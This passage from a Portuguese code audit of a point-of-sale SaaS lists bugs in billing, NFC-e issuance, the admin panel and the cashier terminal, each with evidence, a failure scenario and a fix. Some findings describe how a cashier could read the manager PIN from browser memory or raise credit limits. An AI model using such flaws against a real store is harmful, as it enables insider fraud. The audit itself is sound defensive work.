- **Onde:** `operations/services.py:101` · área `operations-integracoes` · categoria `money` · confirmado
- **Evidência:** `elif state in ('refunded','disputed') and binding.active and sub.external_id==binding.external_id and sub.current_period_end==period_end: sub.status='past_due'; sub.save(update_fields=['status','updated_at'])` — `current_period_end` não é alterado. Em cloud/core/api_common.py:157-166, `subscription_window` aceita `past_due` enquanto `current_period_end + 72h > now` e segue emitindo licença de terminal (cloud/core/views_terminal.py:83-87, só reduz a validade do lease para 24h).
- **Cenário de falha:** Cliente contrata plano anual; a API aceita `billing_type='UNDEFINED'` (operations/views.py:150), que no Asaas permite pagar com cartão. Paga, recebe `current_period_end` = +12 meses, abre chargeback (ou a plataforma estorna o Pix no direito de arrependimento). O reconcile grava `past_due`, mas painel e caixas continuam funcionando por 12 meses + 72h sem receita.
- **Correção:** No ramo refunded/disputed, recuar `current_period_end` para o fim do último período efetivamente pago (ou `timezone.now()`), de modo que só reste a carência de 72h; registrar auditoria. Para 'disputed' pode-se manter carência até a decisão, mas com teto curto. Cobrir com teste (hoje não há teste para refund).

### Solicitação de assinatura que falha vira beco sem saída: job `billing.subscribe` em `needs_review` bloqueia para sempre novas tentativas da empresa

- **Onde:** `operations/views.py:159` · área `operations-integracoes` · categoria `correctness` · confirmado
- **Evidência:** Linhas 159-160: `pending=ProviderJob.objects.filter(tenant=...,kind='billing.subscribe',status__in=['queued','running','needs_review']).exclude(idempotency_key=key); if pending.exists(): raise APIError('Já há solicitação de assinatura pendente de conciliação',409)`. Em operations/services.py:226-235 qualquer erro de `billing.subscribe` (HTTP 400 do Asaas, ValueError) vai direto para `needs_review` sem retry. CPF/CNPJ e e-mail não são validados na view (l.154-155: só `text(...)`), e `create_customer` lança ValueError se o documento não tiver 11/14 dígitos (integrations/billing.py:29-30); plano com `price_year_cents=0` (default do modelo) + ciclo Anual gera `ValueError('Preço inválido')` (billing.py:39-40). Não existe endpoint para descartar o job: `reconcile_job` (views.py:279-288) só aceita `subscription_id` existente ou `recover_customer`, que reenfileira o MESMO payload inválido; ProviderJob/BillingBinding não estão no Django admin (cloud/core/admin.py).
- **Cenário de falha:** Dono digita o CNPJ com um dígito errado (ou e-mail inválido, ou escolhe 'Anual' num plano sem preço anual). O Asaas responde 400, o job fica em `needs_review`. Ao corrigir e reenviar, a chave de idempotência muda e a API devolve 409 'Já há solicitação pendente'; com a mesma chave devolve o job travado. A empresa não consegue mais contratar: o trial acaba e o cliente é perdido, a menos que alguém edite o banco à mão.
- **Correção:** Distinguir falha definitiva e segura (4xx de validação antes de existir assinatura remota, ValueError de validação local) com status `failed`, que não bloqueia nova solicitação; manter `needs_review` só para resultado incerto (timeout/5xx em POST). Criar ação de plataforma 'descartar solicitação' que confirma no Asaas (GET por externalReference=job.pk) que não há assinatura antes de liberar. Validar CPF/CNPJ (dígitos verificadores), e-mail e preço > 0 na view, antes de enfileirar.

### Não existe cancelamento nem troca de plano: o vínculo com o Asaas nunca é desativado, a empresa não consegue recontratar e ajuste manual é revertido no pagamento seguinte

- **Onde:** `operations/views.py:161` · área `operations-integracoes` · categoria `money` · confirmado
- **Evidência:** Linhas 161-162: se existe `BillingBinding(active=True)` a contratação responde 409 'Já há assinatura no provedor; solicite alteração à plataforma'. integrations/billing.py (l.15-62) só tem create_customer/find_customers/create_subscription/get_*: não há DELETE/POST de atualização de assinatura. O único código que põe `active=False` é a concessão VIP (cloud/core/views_platform.py:391-396). O webhook ignora todo evento sem `payment` (views.py:177-178), ou seja, SUBSCRIPTION_DELETED/INACTIVATED nunca chegam ao vínculo. Em services.py:77-78 pagamento com valor diferente de `binding.amount_cents` lança 'Valor cobrado diverge da assinatura'; e em services.py:93-100 `paid_takeover` regrava `sub.plan=binding.plan` quando `license_source!='subscription'` (que é o que o PATCH manual em views_platform.py:340-341 grava).
- **Cenário de falha:** (1) Cliente do plano Básico quer subir para o Pro: 409. O suporte altera o plano via PATCH /platform/subscriptions (fonte 'manual') e o valor no painel do Asaas; no próximo pagamento o reconcile lança 'Valor cobrado diverge' (needs_review) e a assinatura não renova: cliente pagante é bloqueado em 72h. Se não alterar o valor, o reconcile devolve o cliente ao plano Básico. (2) Cliente cancela ou a empresa é desativada (views_platform.py:186-210): o Asaas continua gerando boletos/Pix e cobrando; se a plataforma apagar a assinatura no Asaas, o vínculo fica ativo e a empresa nunca mais consegue assinar pelo painel. (3) Reajuste anual de preço feito no Asaas quebra todos os pagamentos seguintes.
- **Correção:** Implementar em integrations/billing.py `update_subscription` (POST /subscriptions/{id} com value/cycle/billingType, updatePendingPayments) e `cancel_subscription` (DELETE /subscriptions/{id}); jobs `billing.change_plan` e `billing.cancel` que atualizam `BillingBinding` (plan, amount_cents, active) na mesma transação; tratar eventos SUBSCRIPTION_* no webhook consultando GET /subscriptions/{id} e desativando o vínculo; ao desativar tenant, enfileirar cancelamento. Expor na UI da empresa 'Trocar plano' e 'Cancelar assinatura'.

### Conector Focus NFe rejeita a resposta real de nota autorizada (`chave_nfe` vem com prefixo "NFe" e não há `numero_protocolo` no nível superior): NFC-e autorizada ficaria 'pendente' para sempre

- **Onde:** `operations/services.py:150` · área `operations-integracoes` · categoria `correctness` · confirmado
- **Evidência:** `if state=='authorized' and (not str(response.get('chave_nfe','')).isdigit() or len(str(response.get('chave_nfe','')))!=44 or not response.get('numero_protocolo')): state='pending'`. Conferi na documentação oficial (doc.focusnfe.com.br/reference/emitir_nfce e consultar_nfce): o exemplo de autorizada traz `"chave_nfe": "NFe41190612345678000123650010000000121743484310"` (47 caracteres, não numérico); a resposta do POST não tem protocolo e, no GET com `completa=1`, o exemplo traz o campo de nível superior `protocolo` (o `numero_protocolo` aparece dentro de `protocolo_nota_fiscal`). Além disso integrations/fiscal.py:70-72 compara `invoice.get('Id')!='NFe'+str(access_key)` e `chNFe!=str(access_key)`, que também falham com a chave prefixada. Nenhum teste cobre `fiscal_result` (operations/tests.py não tem caso fiscal).
- **Cenário de falha:** Na primeira emissão em homologação/produção a SEFAZ autoriza a nota, mas o PDV2 grava status 'pending', o `fiscal.poll` repete 30 vezes (~6,5 h) e cai em `needs_review`; a venda nunca aparece como autorizada, o XML nunca é arquivado e `fiscal_cancel` recusa ('Somente notas autorizadas', operations/views.py:253) — o lojista não consegue cancelar dentro dos 30 minutos uma nota que existe e gera imposto.
- **Correção:** Normalizar a chave: `chave=re.sub(r'\D','',response.get('chave_nfe',''))` e validar 44 dígitos; ler protocolo de `response.get('protocolo') or response.get('numero_protocolo') or response.get('protocolo_nota_fiscal',{}).get('numero_protocolo')`; se o POST autorizar sem protocolo, enfileirar um poll (com `completa=1`) em vez de marcar pendente indefinidamente; em `download_xml` usar a chave normalizada. Criar testes com os JSONs de exemplo da documentação da Focus.

### NFC-e rejeitada, recusada com 422 ou não enviada por falha de rede nunca pode ser corrigida e reenviada para a mesma venda

- **Onde:** `operations/views.py:213` · área `operations-integracoes` · categoria `correctness` · confirmado
- **Evidência:** Linhas 213-219: se já existe `FiscalDocument` da venda e o payload novo difere, responde 409 'Venda já possui requisição fiscal com outros dados'; se for igual, `enqueue('fiscal.submit','fiscal.submit:'+record.pk,...)` devolve o job antigo já `done`/`needs_review` (get_or_create por chave, services.py:22-28) e nada é reenviado. `fiscal.submit` nunca é reexecutado (services.py:227: só reconcile/poll/archive são 'safe'). O botão Consultar cria um `fiscal.poll` (views.py:273-275) cujo GET devolve 404 quando a nota não chegou a existir na Focus, e 404 manda para `needs_review` (services.py:227). O job original fica em `needs_review` para sempre (nunca é atualizado), então o contador `jobs_needing_review` não zera e o segundo clique devolve o poll já concluído.
- **Cenário de falha:** SEFAZ rejeita por NCM/CSOSN errado (status `erro_autorizacao`, o caso mais comum no início), ou a Focus devolve 422 de validação, ou há erro de DNS/conexão antes do envio (tratado como resultado incerto em integrations/base.py:18-20), ou `PDV_ALLOW_LIVE_FISCAL` ainda estava 0 (fiscal.py:23-25). O lojista corrige o cadastro e tenta de novo: 409 ou resposta do job antigo. A venda fica definitivamente sem documento fiscal.
- **Correção:** Permitir reenvio quando `record.status` ∈ {rejected, queued sem registro no provedor}: atualizar `FiscalPayload.request_payload`, usar chave de idempotência com contador de tentativa (`fiscal.submit:<doc>:<n>`) e manter a mesma `ref` (a Focus aceita reenvio da ref após erro de autorização; responde 422 `already_processed` se já autorizada). No poll, tratar 404 após submit de resultado incerto como 'não recebido' e liberar reenvio. Ao concluir o poll de reconciliação, marcar o job original como resolvido.

### "Carregar mais" das listas de cadastro fica desabilitado para sempre após o primeiro clique; só 100 registros são alcançáveis

- **Onde:** `web/assets/app.js:871` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** Em resourcePage: `const more = button("Carregar mais", async () => { more.disabled = true; try { ... content.replaceChildren(draw(rows)); if (next.next_cursor) { result.next_cursor = next.next_cursor; content.append(footer); } } catch (error) { handleError(error); more.disabled = false; } })`. No caminho de sucesso `more.disabled` nunca volta a false e o mesmo footer/botão é reanexado. A API pagina em 50 (cloud/core/api_common.py:201). Só Produtos tem busca (`search: true`); Clientes, Fornecedores, Categorias e Lojas não têm.
- **Cenário de falha:** Loja com 180 clientes: a tela Clientes mostra 50, o usuário clica em "Carregar mais" (100) e o botão fica cinza. Os clientes 101-180 ficam inacessíveis no painel: não dá para editar limite de fiado, abrir Extrato nem usar "Receber tudo em aberto" deles. O mesmo vale para produtos além de 100 quando o usuário navega sem buscar.
- **Correção:** Reabilitar o botão no sucesso (`more.disabled = false` antes de reanexar o footer) ou reutilizar pagedContent(), que recria o botão a cada página. Adicionar campo de busca (a API já aceita ?q= para categories/customers/suppliers) nas demais listas.

### formPayload descarta campos opcionais vazios: é impossível limpar um campo na edição e o painel ainda mostra "Alterações salvas"

- **Onde:** `web/assets/app.js:742` · área `painel-js-1` · categoria `data-loss` · confirmado
- **Evidência:** `if ((value === "" || value === null) && !field.required) continue;` — a chave some do PATCH. O servidor aceita e trata vazio como limpar (cloud/core/views_resources.py:101 `commission_bps` "" -> None; :111 `category_id` "" -> None; :122/:137/:155 textos opcionais -> ""; :223 image_url vazio -> imagem padrão), mas nunca recebe o campo.
- **Cenário de falha:** Gerente define 5% de comissão numa categoria por engano e depois apaga o campo para voltar a "Do vendedor": o PATCH vai só com name/active, o toast diz "Alterações salvas." e a comissão da categoria continua sobrepondo a do vendedor (commission_logic.py:27) em todas as vendas. Mesmo efeito ao tentar remover categoria/variação/NCM/PLU de balança/URL de imagem de um produto, endereço da loja ou e-mail/telefone/documento de cliente.
- **Correção:** Na edição, enviar o valor vazio explicitamente ("" para texto, null para category_id/commission_bps) em vez de `continue`; manter o descarte apenas na criação. Passar um flag `editing` para formPayload.

### Registros inativos nunca são listados: desativar produto, cliente, categoria ou loja é irreversível pelo painel

- **Onde:** `web/assets/app.js:829` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** resourcePage busca `api.get(spec.endpoint + suffix)` com suffix só `?q=`; o servidor filtra `active=True` a menos que venha `include_inactive=1` (cloud/core/views_resources.py:179) e nenhum arquivo em web/assets envia esse parâmetro (grep sem ocorrências). O formulário tem checkbox "Produto ativo/Cliente ativo" e a tabela tem coluna Estado com "Inativo", que nunca aparece.
- **Cenário de falha:** Usuário clica em "Desativar" num produto (ou desmarca "Cliente ativo" e salva). A linha some da lista e da busca; não há como reabrir o cadastro para reativar. Um cliente desativado com fiado em aberto desaparece de Clientes, e com ele o acesso ao Extrato e ao recebimento do fiado.
- **Correção:** Para papéis com permissão de edição, carregar com `include_inactive=1` (ou oferecer filtro "Mostrar inativos") e trocar a ação "Desativar" por "Reativar" quando `row.active === false`.

### Promoção "Leve X pague Y" não pode ser criada nem editada no painel: o campo de preço oculto e vazio derruba o envio

- **Onde:** `web/assets/app.js:1955` · área `painel-js-2` · categoria `correctness` · confirmado
- **Evidência:** promotionForm declara `{ key: "price_cents", type: "money", min: 0 }` sem required (l.1933) e o esconde quando kind = buy_x_pay_y (l.1946). No submit, `formPayload(form, fields)` (l.1955) roda antes do ajuste `data.price_cents = null` (l.1958). parseMoneyInput("") devolve NaN (l.26); em formPayload o NaN não cai no `continue` de campo vazio (l.742) e bate em `!Number.isSafeInteger(value)` (l.746), lançando "Preço promocional por unidade (R$): informe um número válido.". Confirmei o comportamento do parser executando-o em node.
- **Cenário de falha:** Lojista abre Promoções > Nova promoção, escolhe "Leve X pague Y", preenche Leve 3 / Pague 2 e salva: aparece erro pedindo um preço num campo que não está na tela. O mesmo acontece ao editar uma promoção leve-pague existente (price_cents vem null), então nem desativá-la pelo painel é possível.
- **Correção:** Em formPayload, tratar money/milli vazio como ausente quando o campo não é required (ex.: `if (input.value.trim()==="" && !field.required) continue;` antes do parse), ou em promotionForm montar a lista de campos conforme o tipo (excluir price_cents/min_quantity_milli quando buy_x_pay_y) antes de chamar formPayload.

### Seletores de produto/categoria/cliente/fornecedor carregam só 50 registros em ordem de UUID, sem busca

- **Onde:** `web/assets/app.js:1931` · área `painel-js-2` · categoria `correctness` · confirmado
- **Evidência:** promotionForm usa `type: "source", source: "/products"` e `"/categories"` (l.1931-1932); financeForm usa `/customers` e `/suppliers` (l.2363-2364); stockReceipt faz `api.get("/suppliers")` (l.2054). fieldNode busca `records(await api.get(field.source))` uma única vez (l.670-672). No servidor a listagem pagina com limite padrão 50 (cloud/core/api_common.py:201) e ordena por `id`, que é UUID (cloud/core/views_resources.py:181).
- **Cenário de falha:** Mercado com 800 produtos: o select "Produto" da promoção mostra 50 itens aleatórios; os outros 750 não podem receber promoção. Ao editar uma promoção cujo produto está fora desses 50, o select fica em branco, o PATCH vai com product_id null e o servidor responde "Escolha um produto ou uma categoria" — não dá para alterar nem desativar a promoção. No Financeiro, loja com mais de 50 clientes não consegue vincular o título ao cliente certo.
- **Correção:** Trocar esses selects pelo productPicker já existente (busca com ?q=) e criar um equivalente para clientes/fornecedores/categorias; ao editar, garantir que o registro atual entre na lista (GET /products/<id>). No mínimo paginar até o fim com collectPages e ordenar por nome no servidor.

### Estoque: "Movimentações recentes" mostra UUID no lugar do produto e arredonda kg/litro; "Entradas recentes" mostra UUID do fornecedor

- **Onde:** `web/assets/app.js:2301` · área `painel-js-2` · categoria `correctness` · confirmado
- **Evidência:** A tabela usa `row.product_name || row.product_id` e `quantity(row.delta_milli, row.unit || "UN")` (l.2301) e `row.supplier_name || row.supplier_id` (l.2306). O serializer `movement` (cloud/core/serializers.py:64) só devolve product_id, delta_milli, source, reason, reference... — não há product_name nem unit; `receipt` (l.73) não devolve supplier_name. quantity() com unidade "UN" usa maximumFractionDigits 0 (core.js).
- **Cenário de falha:** Gerente abre Estoque para conferir um ajuste de -0,350 kg de queijo: a linha aparece como "3f2a9c1e-…  -0 UN". Toda movimentação de produto por peso/litro aparece zerada ou arredondada e nenhuma linha identifica o produto; a coluna Fornecedor exibe um UUID. A tela de auditoria de estoque fica inutilizável.
- **Correção:** Incluir product_name, sku e unit no serializer movement (select_related("product") em views_stock.movements) e supplier_name no receipt (select_related("supplier")); o JS já está pronto para esses campos.

### Solicitação de assinatura sem validação de CPF/CNPJ: qualquer falha deixa a empresa travada sem poder assinar

- **Onde:** `web/assets/app.js:3252` · área `painel-js-2` · categoria `money` · confirmado
- **Evidência:** billingForm só marca os campos como required (`inputField("billing-document","CPF ou CNPJ")`, l.3252) e envia o texto cru (l.3258-3265). No worker, documento com tamanho errado, CPF recusado pelo Asaas (HTTP 400) ou simples timeout do Asaas levam o job billing.subscribe direto para needs_review (operations/services.py run_one: subscribe não está na lista de retry). Em operations/views.py:159 qualquer job billing.subscribe em queued/running/needs_review com outra chave gera 409 "Já há solicitação de assinatura pendente de conciliação". Como o payload corrigido muda a assinatura do idempotency() (l.3262), a nova tentativa sempre tem outra chave.
- **Cenário de falha:** Dono digita o CNPJ com um dígito a menos e clica em Solicitar assinatura. O job falha e fica em "Revisão necessária". Ele corrige o CNPJ e tenta de novo: 409 para sempre. No admin SaaS, reconcileBillingJob (l.3070) só oferece "consultar cliente" (falha, pois o cliente nunca foi criado) ou informar uma assinatura existente; não há como descartar o job. O cliente quer pagar e não consegue.
- **Correção:** No formulário: validar 11/14 dígitos e dígitos verificadores de CPF/CNPJ e formato do e-mail antes do POST. No servidor: permitir nova solicitação quando o job em needs_review não tem customer_id/subscription_id (falha antes de qualquer mutação no provedor) e dar retry automático para erros de rede no GET find_customers. No admin SaaS: ação "Descartar solicitação" para jobs sem efeito no provedor.

### Página "Serviços" do admin SaaS quebra inteira para quem tem só o papel de Atendimento

- **Onde:** `web/assets/app.js:3149` · área `painel-js-2` · categoria `correctness` · confirmado
- **Evidência:** platformNav libera `services` para platform_support, platform_billing e platform_ops (l.66). platformServices faz `Promise.all([api.get("/ops/health"), api.get("/ops/jobs",{tenant:false}), ...])` (l.3147-3151). O endpoint jobs exige `platform_user(request,roles=('platform_ops','platform_billing'))` (operations/views.py:138).
- **Cenário de falha:** Usuário de suporte (platform_support) clica em Serviços: /ops/jobs responde 403, o Promise.all rejeita e a tela inteira vira "Falha ao carregar — Sem permissão de plataforma", escondendo inclusive os indicadores de fila e de backup que ele tem direito de ver.
- **Correção:** Só chamar /ops/jobs quando platformCan("platform_ops","platform_billing") (como já é feito com o Asaas na l.3150), ou usar Promise.allSettled e renderizar cada bloco de forma independente; alternativamente incluir platform_support na leitura de jobs no servidor.

### PIN do gerente fica guardado em claro na memória da página e pode ser lido pelo operador de caixa

- **Onde:** `terminal/static/terminal.js:300` · área `terminal-js` · categoria `security` · confirmado
- **Evidência:** applyDiscount grava `state.discountApproval={percent,amountCents,managerPin:pin}` (linha 300) e submitSale reenvia `manager_pin:state.discountApproval?.managerPin` (linha 352). `state` é um `const` de topo em script clássico (linha 2), acessível pelo console do navegador. lockTerminal/logout (linhas 447-448) só fazem `state.cart=[]`, sem limpar a aprovação.
- **Cenário de falha:** Gerente digita o PIN para liberar 5% de desconto. O caixa abre o DevTools (F12 não é bloqueado) e lê `state.discountApproval.managerPin`. Com o PIN ele passa a autorizar sozinho remoção de item, cancelamento de venda, devolução em dinheiro, fiado acima do limite e fechamento de caixa (todos usam manager_override com o mesmo PIN).
- **Correção:** Fazer /api/discount/authorize devolver um token de autorização de uso único (amarrado a request_id, valor e validade curta) e enviar esse token na venda; nunca guardar o PIN no front. Limpar aprovação/pagamento/cliente em lockTerminal e logout chamando resetCart().

### Sangria e suprimento existem no backend mas estão inacessíveis na tela do caixa

- **Onde:** `terminal/templates/index.html:117` · área `terminal-js` · categoria `ux-bug` · confirmado
- **Evidência:** Os botões `supplyBtn`, `withdrawBtn` e `openCashBtn` estão dentro de `<div id="cashStateProxy" class="hidden" aria-hidden="true">` e `.hidden{display:none!important}` (terminal.css). terminal.js:468 liga cashAction('supplied'/'withdrawn') apenas a esses botões ocultos; o cabeçalho só tem Abrir/Fechar caixa. docs/STATUS-V2.md linha 9 afirma que o terminal executa sangria/suprimento.
- **Cenário de falha:** Operador retira R$ 500 do caixa para o cofre no meio do turno: não existe botão para registrar. No fechamento o esperado fica R$ 500 acima do contado e o turno fecha com 'falta' falsa (ou o dinheiro sai sem registro de auditoria).
- **Correção:** Expor na frente de caixa (cabeçalho ou painel de caixa) os botões Sangria e Suprimento visíveis quando há caixa aberto, com atalho de teclado, reutilizando cashAction; remover o proxy oculto.

### Balança serial sobrescreve a quantidade do último item tocado, inclusive produto vendido por unidade, e não trava o peso capturado

- **Onde:** `terminal/static/terminal.js:20` · área `terminal-js` · categoria `money` · confirmado
- **Evidência:** applyScaleWeight: `const target=state.scale.targetId?state.cart.find(item=>item.id===state.scale.targetId):null; const item=target||[...].find(row=>row.unit==='KG'); ... item.quantity_milli=milli` — não verifica `unit==='KG'` no alvo. addProduct define `state.scale.targetId=id` para qualquer produto (linha 293). readScale (linha 22) aplica toda linha recebida, sem checar estabilidade nem se há diálogo aberto. Com balança conectada, reselecionar um KG já no carrinho faz `existing.quantity_milli=0` (linha 293).
- **Cenário de falha:** Balança em modo contínuo: pesa banana 1,200 kg e deixa no prato; bipa um refrigerante (UN). O alvo vira o refrigerante e a próxima leitura grava quantidade 1,2 UN (a venda falha depois com 'Produto UN exige quantidade inteira'). Ou: tira a banana e apoia outro objeto no prato antes de escolher o produto: a banana passa de 1,200 para 0,800 kg e o cliente paga menos. Segundo saco do mesmo produto zera o primeiro em vez de somar. Cada leitura também apaga `discountApproval`, derrubando desconto já autorizado.
- **Correção:** Aplicar peso somente a item KG que esteja explicitamente 'aguardando peso' (quantity_milli===0 marcado pelo addProduct); após capturar, limpar targetId (travar). Ignorar leituras quando activeConfirm estiver aberto. Para segundo saco do mesmo produto, somar ao existente. Exigir N leituras iguais consecutivas (peso estável) antes de aplicar.

### Etiqueta de balança (EAN iniciado em 2) só encontra produtos entre os 150 primeiros do catálogo

- **Onde:** `terminal/static/terminal.js:454` · área `terminal-js` · categoria `correctness` · confirmado
- **Evidência:** processScannerInput: `const all=(await api('/api/products')).products||[]; const decoded=decodeScaleBarcode(query,all)`. No backend, Store.products termina em `ORDER BY name LIMIT 150` (terminal/store.py:924). A busca por scale_code é feita no cliente sobre essa lista truncada.
- **Cenário de falha:** Mercado com 2.000 produtos: a etiqueta de 'Tomate' ou 'Queijo mussarela' (fora dos 150 primeiros nomes em ordem alfabética) retorna 'Código não encontrado · confira o cadastro'. O operador precisa lançar e digitar o peso manualmente em todo item pesado.
- **Correção:** Resolver a etiqueta no backend: endpoint (ou parâmetro em /api/products) que faça `SELECT ... WHERE unit='KG' AND scale_code=?` direto no SQLite e devolva o produto; o front só decodifica prefixo/payload.

### Tela de login refaz o select de operadores a cada 15 s e volta a seleção para o primeiro nome

- **Onde:** `terminal/static/terminal.js:276` · área `terminal-js` · categoria `ux-bug` · confirmado
- **Evidência:** O setInterval (linha 510) chama loadSession() a cada 15 s quando não há operador logado; loadSession faz `$('operatorSelect').innerHTML=operators.map(...)` sem preservar o valor atual (renderSellers e renderCustomers preservam `current`, este não). Além disso, cada ciclo chama refreshOperators → POST /api/bootstrap, que baixa o catálogo inteiro paginado da nuvem (terminal/sync.py:68-90).
- **Cenário de falha:** Loja com Ana, Bruno e Carla: Carla escolhe o próprio nome e começa a digitar o PIN; o tick de 15 s reconstrói o select e volta para 'Ana'. O login vai com o PIN da Carla no operador Ana: 'Operador ou PIN inválido' e a falha conta para Ana (store.login bloqueia por 5 min após 5 falhas). Efeito colateral: terminal parado na tela de login baixa o catálogo completo a cada 15 s.
- **Correção:** Guardar `const current=select.value` e restaurar após reconstruir (ou só reconstruir se a lista mudou e o select não estiver com foco). Não chamar bootstrap completo no polling da tela de login; atualizar operadores em intervalo maior (ex.: 5 min) ou só no botão 'Atualizar operadores'.

### Operador de caixa com impressora CUPS: toda venda abre o diálogo de impressão do sistema e pode imprimir em dobro

- **Onde:** `terminal/static/terminal.js:185` · área `terminal-js` · categoria `correctness` · confirmado
- **Evidência:** autoPrintReceipt: se `receipt.driver==='cups'` chama `api('/api/print/discover')`; o catch devolve `{status:'A fila CUPS não está acessível pelo contêiner...',autoPrint:true}`. Em terminal/app.py:369-370 a rota é `@authenticated(*MANAGER_ROLES)`, então para papel cashier sempre responde 403. O worker em segundo plano (terminal/sync.py:221, `while print_once(self.store)`) imprime o job térmico de qualquer forma.
- **Cenário de falha:** Caixa (papel cashier) em macOS/Linux com térmica via CUPS: a cada venda aparece a mensagem falsa de fila inacessível e, 180 ms depois, `window.print()` abre o diálogo modal do navegador, travando o caixa até cancelar; se confirmar, sai um segundo comprovante além do térmico.
- **Correção:** Não depender de /api/print/discover no fluxo de venda: usar o resultado do próprio /api/print/flush (ou o status do job da venda) para decidir o fallback; se a checagem for mantida, liberar a rota para SELL_ROLES. Só abrir window.print() quando o job térmico falhar de fato.

### Estorno no caixa de uma venda com NFC-e autorizada trava para sempre a fila de sincronização daquele terminal

- **Onde:** `cloud/core/sale_logic.py:199` · área `fiscal-ponta-a-ponta` · categoria `data-loss` · confirmado
- **Evidência:** `reverse_sale` levanta `APIError("Documento fiscal exige cancelamento fiscal separado", 409)` se há FiscalDocument `authorized` (l.199-200). O evento `sale.voided` é aplicado dentro do `transaction.atomic()` único do lote em views_terminal.py l.477-513 (l.495-502). O terminal não conhece estado fiscal: `void_sale` (terminal/store.py l.1278-1314) estorna localmente e enfileira o evento. `sync_once` (terminal/sync.py l.134-155) reenvia sempre os mesmos 50 primeiros eventos pendentes e não tem como pular um evento recusado.
- **Cenário de falha:** Venda sincronizada e NFC-e autorizada via /ops/fiscal/submit. O gerente estorna a venda no caixa (mesmo turno). O caixa devolve estoque e dinheiro localmente e enfileira `sale.voided`. A nuvem responde 409 e desfaz o lote inteiro; o terminal repete o mesmo lote a cada ciclo. Todas as vendas, sangrias e fechamentos posteriores desse caixa deixam de chegar à nuvem (a licença continua renovando pelo bootstrap, então o caixa segue vendendo). Se o prazo de cancelamento da SEFAZ passar, não há como destravar; se o computador falhar, as vendas não sincronizadas se perdem.
- **Correção:** Não rejeitar o lote por causa desse evento: aceitar o `sale.voided`, registrar um SyncConflict `fiscal_cancel_required` (venda fica marcada para cancelamento/devolução fiscal) e confirmar o evento. No terminal, bloquear o estorno local quando a venda tiver estado fiscal autorizado (exige levar o estado fiscal ao terminal) e criar tratamento de evento-veneno (quarentena após N recusas 4xx).

### Emissão rejeitada ou que falhou no envio vira beco sem saída: o payload fica travado no primeiro envio e a tarefa nunca é reexecutada

- **Onde:** `operations/views.py:213` · área `fiscal-ponta-a-ponta` · categoria `correctness` · confirmado
- **Evidência:** `if record: if FiscalPayload...request_payload!=body: raise APIError('Venda já possui requisição fiscal com outros dados',409)` (l.213-215) e depois `enqueue('fiscal.submit',...,'fiscal.submit:'+str(record.pk),...)` (l.219). `enqueue` usa `get_or_create(idempotency_key=key)` e devolve a tarefa existente em qualquer estado (services.py l.22-28). `reconcile_job` para `fiscal.submit` só agenda `fiscal.poll` (views.py l.273-275). `ProviderClient.request` descarta o corpo do erro: `Provedor recusou a operação (HTTP {status})` (integrations/base.py l.21-24). `_live()` levanta ProviderError sem `outcome_unknown` (integrations/fiscal.py l.23-25).
- **Cenário de falha:** NFC-e volta rejeitada (NCM inválido, CSOSN errado, total divergente) ou o POST recebe 401/422, ou a produção está bloqueada por PDV_ALLOW_LIVE_FISCAL. Corrigir o payload e reenviar dá 409; reenviar o mesmo payload devolve 202 com a tarefa antiga (`done`/`needs_review`) e nada roda. 'Consultar' faz GET e recebe 404 para referência nunca criada, indo de novo para revisão. Falha de conexão antes de chegar ao provedor também é tratada como incerta e termina no mesmo 404. A venda fica definitivamente sem nota e o operador só vê 'HTTP 422', sem o motivo.
- **Correção:** Permitir novo envio quando o documento estiver `rejected`, `denied` ou a tarefa de envio terminou com erro definitivo (4xx/bloqueio local) ou o poll confirmou 404: substituir o request_payload guardando histórico de tentativas e criar nova tarefa com chave por tentativa (`fiscal.submit:<doc>:<n>`). Guardar em `error_message` o corpo de erro do provedor (codigo/mensagem/erros) e marcar o documento como `failed` em vez de deixá-lo `queued`.

### Devolução (parcial ou total) ignora a NFC-e e a emissão ignora devoluções já feitas

- **Onde:** `cloud/core/credit_logic.py:75` · área `fiscal-ponta-a-ponta` · categoria `money` · confirmado
- **Evidência:** `validate_return`/`_persist_return` (l.75-182) e `panel_return` (l.206-231) não consultam FiscalDocument; só `reverse_sale` bloqueia (sale_logic.py l.199). A venda continua `completed` após devolução. `fiscal_submit` exige apenas `status='completed'`, `total==sale.total_cents` e quantidades iguais às linhas originais (operations/views.py l.198-212), sem olhar `sale.returns`. Não há nenhum fluxo de NF-e de devolução (integrations/fiscal.py só usa /v2/nfce).
- **Cenário de falha:** (a) Venda de R$ 500 com NFC-e autorizada: o cancelamento é bloqueado, mas o gerente registra devolução de 100% dos itens no painel ou no caixa. Estoque e dinheiro voltam, a nota de R$ 500 continua autorizada e a loja recolhe imposto sobre venda desfeita, sem documento fiscal de entrada. (b) Venda com devolução parcial antes da emissão: a API só aceita payload com total e quantidades originais, emitindo nota maior que a venda efetiva.
- **Correção:** Em `validate_return`, quando existir FiscalDocument autorizado: dentro do prazo e devolução total, exigir cancelamento fiscal; fora disso, registrar pendência de NF-e de devolução (modelo 55, finalidade 4) e sinalizar no painel. Em `fiscal_submit`, recusar ou ajustar emissão de venda com devoluções. Guardar no SaleReturn o vínculo com o documento fiscal de devolução.

### Emitente é único por empresa: filiais imprimem CNPJ, IE e endereço da matriz e não conseguem emitir com o próprio CNPJ

- **Onde:** `cloud/core/views_terminal.py:61` · área `fiscal-ponta-a-ponta` · categoria `correctness` · confirmado
- **Evidência:** `_issuer_profile(tenant)` monta razão social, documento, IE e endereço só a partir de Tenant (l.61-79) e é enviado a todos os terminais (l.262, l.306). `Shop.address` (models.py l.90) não é usado em nenhum comprovante. `fiscal_submit` exige `issuer == member.tenant.document` (operations/views.py l.203-205). IntegrationAccount é único por (tenant, provider) (operations/models.py l.13-15) e série/numeração ficam em Tenant (models.py l.50-51).
- **Cenário de falha:** Empresa com plano de 2 lojas (matriz 0001 e filial 0002 em outro bairro ou cidade). Todo comprovante da filial sai com CNPJ, IE e endereço da matriz. Ao emitir NFC-e, a venda da filial só é aceita com o CNPJ da matriz ('Emitente deve corresponder ao documento cadastrado na empresa'), ou seja, a nota sai pelo estabelecimento errado, com ICMS e estoque fiscal atribuídos à matriz.
- **Correção:** Levar o perfil fiscal para Shop (CNPJ, IE, endereço, série, credencial/empresa no provedor), com fallback para Tenant; `_issuer_profile(terminal.shop)`; validar o emitente do payload contra o documento da loja da venda; IntegrationAccount por loja ou mapeamento loja→empresa do provedor.

### Operador de caixa consegue aumentar o limite de fiado de qualquer cliente pelo painel/API, anulando a exigência de PIN de gerente no terminal

- **Onde:** `cloud/core/views_resources.py:22` · área `planos-permissoes-matriz` · categoria `security` · confirmado
